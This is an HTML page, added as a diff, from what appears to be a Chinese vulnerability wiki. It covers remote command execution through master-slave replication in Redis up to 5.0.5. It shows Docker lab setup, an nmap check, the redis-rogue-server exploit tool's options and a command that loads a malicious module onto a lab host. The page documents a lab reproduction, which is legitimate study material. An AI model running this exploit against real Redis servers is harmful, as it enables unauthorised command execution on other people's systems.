@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/Redis/Redis%20%E5%B0%8F%E4%BA%8E5.0.5%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Redis 小于5.0.5 主从复制远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Redis \u5c0f\u4e8e5.0.5 \u4e3b\u4ece\u590d\u5236\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u5f71\u54cd\u7248\u672c", url: "#_2" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846-25592/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846-25592/" class="btn btn-xs btn-link">
+        SaltStack 未授权访问命令执行漏洞 CVE-2020-16846 25592
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Redis%20Lua%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2022-0543/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Redis%20Lua%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2022-0543/" class="btn btn-xs btn-link">
+        Redis Lua 沙箱绕过 远程命令执行 CVE-2022-0543
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="redis-505">Redis 小于5.0.5 主从复制远程命令执行漏洞<a class="headerlink" href="#redis-505" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大</p>
+<p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">Pavel Toporkov的分享</a></p>
+<h2 id="_2">影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>Redis &lt;= 5.0.5</a-checkbox></br></p>
+<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>docker<span class="w"> </span>pull<span class="w"> </span>damonevking/redis5.0<span class="w"> </span>
+docker<span class="w"> </span>run<span class="w"> </span>-p<span class="w"> </span><span class="m">6379</span>:6379<span class="w"> </span>-d<span class="w"> </span>damonevking/redis5.0<span class="w"> </span>redis-server
+</code></pre></div>
+<p>nmap扫描一下6379端口开放即为搭建成功</p>
+<div class="highlight"><pre><span></span><code>root@kali:~/桌面#<span class="w"> </span>docker<span class="w"> </span>pull<span class="w"> </span>damonevking/redis5.0<span class="w"> </span>
+Using<span class="w"> </span>default<span class="w"> </span>tag:<span class="w"> </span>latest
+
+latest:<span class="w"> </span>Pulling<span class="w"> </span>from<span class="w"> </span>damonevking/redis5.0
+fc7181108d40:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>
+3e0ac67cad82:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>
+6ee495cb7235:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>
+9f7206d08b9d:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>
+a8354ef8cccb:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>
+53afb10d81c2:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>
+Digest:<span class="w"> </span>sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f
+Status:<span class="w"> </span>Downloaded<span class="w"> </span>newer<span class="w"> </span>image<span class="w"> </span><span class="k">for</span><span class="w"> </span>damonevking/redis5.0:latest
+docker.io/damonevking/redis5.0:latest
+root@kali:~/桌面#<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>-p<span class="w"> </span><span class="m">6379</span>:6379<span class="w"> </span>-d<span class="w"> </span>damonevking/redis5.0<span class="w"> </span>redis-server
+1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12
+root@kali:~/桌面#<span class="w"> </span>nmap<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">6379</span>
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.80<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2020</span>-12-08<span class="w"> </span><span class="m">21</span>:47<span class="w"> </span>CST
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>localhost<span class="w"> </span><span class="o">(</span><span class="m">127</span>.0.0.1<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.000099s<span class="w"> </span>latency<span class="o">)</span>.
+
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
+<span class="m">6379</span>/tcp<span class="w"> </span>open<span class="w">  </span>redis
+
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">0</span>.10<span class="w"> </span>seconds
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>关于漏洞原理请查看<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">Pavel Toporkov的分享</a></p>
+<p>漏洞利用脚本: <a href="https://github.com/n0b0dyCN/redis-rogue-server">n0b0dyCN/redis-rogue-server</a></p>
+<div class="highlight"><pre><span></span><code>➜<span class="w"> </span>./redis-rogue-server.py<span class="w"> </span>-h
+______<span class="w">         </span>_<span class="w"> </span>_<span class="w">      </span>______<span class="w">                         </span>_____<span class="w">                          </span>
+<span class="p">|</span><span class="w"> </span>___<span class="w"> </span><span class="se">\ </span><span class="w">      </span><span class="p">|</span><span class="w"> </span><span class="o">(</span>_<span class="o">)</span><span class="w">     </span><span class="p">|</span><span class="w"> </span>___<span class="w"> </span><span class="se">\ </span><span class="w">                      </span>/<span class="w">  </span>___<span class="p">|</span><span class="w">                         </span>
+<span class="p">|</span><span class="w"> </span><span class="p">|</span>_/<span class="w"> </span>/___<span class="w">  </span>__<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w"> </span>___<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_/<span class="w"> </span>/___<span class="w">   </span>__<span class="w"> </span>_<span class="w"> </span>_<span class="w">   </span>_<span class="w">  </span>___<span class="w">  </span><span class="se">\ </span><span class="sb">`</span>--.<span class="w">  </span>___<span class="w"> </span>_<span class="w"> </span>____<span class="w">   </span>_____<span class="w"> </span>_<span class="w"> </span>__<span class="w"> </span>
+<span class="p">|</span><span class="w">    </span>//<span class="w"> </span>_<span class="w"> </span><span class="se">\/</span><span class="w"> </span>_<span class="sb">`</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/<span class="w"> </span>__<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">    </span>//<span class="w"> </span>_<span class="w"> </span><span class="se">\ </span>/<span class="w"> </span>_<span class="sb">`</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>/<span class="w"> </span>_<span class="w"> </span><span class="se">\ </span><span class="w"> </span><span class="sb">`</span>--.<span class="w"> </span><span class="se">\/</span><span class="w"> </span>_<span class="w"> </span><span class="se">\ </span><span class="s1">&#39;__\ \ / / _ \ &#39;</span>__<span class="p">|</span>
+<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="se">\ \ </span><span class="w"> </span>__/<span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\_</span>_<span class="w"> </span><span class="se">\ </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="se">\ \ </span><span class="o">(</span>_<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>__/<span class="w"> </span>/<span class="se">\_</span>_/<span class="w"> </span>/<span class="w">  </span>__/<span class="w"> </span><span class="p">|</span><span class="w">   </span><span class="se">\ </span>V<span class="w"> </span>/<span class="w">  </span>__/<span class="w"> </span><span class="p">|</span><span class="w">   </span>
+<span class="se">\_</span><span class="p">|</span><span class="w"> </span><span class="se">\_\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span>___/<span class="w"> </span><span class="se">\_</span><span class="p">|</span><span class="w"> </span><span class="se">\_\_</span>__/<span class="w"> </span><span class="se">\_</span>_,<span class="w"> </span><span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span><span class="w"> </span><span class="se">\_</span>___/<span class="w"> </span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="w">    </span><span class="se">\_</span>/<span class="w"> </span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="w">   </span>
+<span class="w">                                     </span>__/<span class="w"> </span><span class="p">|</span><span class="w">                                            </span>
+<span class="w">                                    </span><span class="p">|</span>___/<span class="w">                                             </span>
+@copyright<span class="w"> </span>n0b0dy<span class="w"> </span>@<span class="w"> </span>r3kapig
+
+Usage:<span class="w"> </span>redis-rogue-server.py<span class="w"> </span><span class="o">[</span>options<span class="o">]</span>
+
+Options:
+<span class="w">  </span>-h,<span class="w"> </span>--help<span class="w">           </span>show<span class="w"> </span>this<span class="w"> </span><span class="nb">help</span><span class="w"> </span>message<span class="w"> </span>and<span class="w"> </span><span class="nb">exit</span>
+<span class="w">  </span>--rhost<span class="o">=</span>REMOTE_HOST<span class="w">  </span>target<span class="w"> </span>host
+<span class="w">  </span>--rport<span class="o">=</span>REMOTE_PORT<span class="w">  </span>target<span class="w"> </span>redis<span class="w"> </span>port,<span class="w"> </span>default<span class="w"> </span><span class="m">6379</span>
+<span class="w">  </span>--lhost<span class="o">=</span>LOCAL_HOST<span class="w">   </span>rogue<span class="w"> </span>server<span class="w"> </span>ip
+<span class="w">  </span>--lport<span class="o">=</span>LOCAL_PORT<span class="w">   </span>rogue<span class="w"> </span>server<span class="w"> </span>listen<span class="w"> </span>port,<span class="w"> </span>default<span class="w"> </span><span class="m">21000</span>
+<span class="w">  </span>--exp<span class="o">=</span>EXP_FILE<span class="w">       </span>Redis<span class="w"> </span>Module<span class="w"> </span>to<span class="w"> </span>load,<span class="w"> </span>default<span class="w"> </span>exp.so
+<span class="w">  </span>-v,<span class="w"> </span>--verbose<span class="w">        </span>Show<span class="w"> </span>full<span class="w"> </span>data<span class="w"> </span>stream
+Example
+</code></pre></div>
+<p><img alt="image-20220309231916165" src="../../../.vuepress/public/img/image-20220309231916165.png" /></p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>redis-rogue-server.py<span class="w"> </span>--rhost<span class="w"> </span><span class="m">192</span>.168.51.146<span class="w"> </span>--lhost<span class="w"> </span><span class="m">192</span>.168.51.146<span class="w"> </span>--exp<span class="o">=</span>exp.so
+</code></pre></div>
+<p><img alt="image-20220309231926604" src="../../../.vuepress/public/img/image-20220309231926604.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846-25592/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846-25592/" class="btn btn-xs btn-link">
+        SaltStack 未授权访问命令执行漏洞 CVE-2020-16846 25592
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Redis%20Lua%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2022-0543/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Redis%20Lua%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2022-0543/" class="btn btn-xs btn-link">
+        Redis Lua 沙箱绕过 远程命令执行 CVE-2022-0543
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
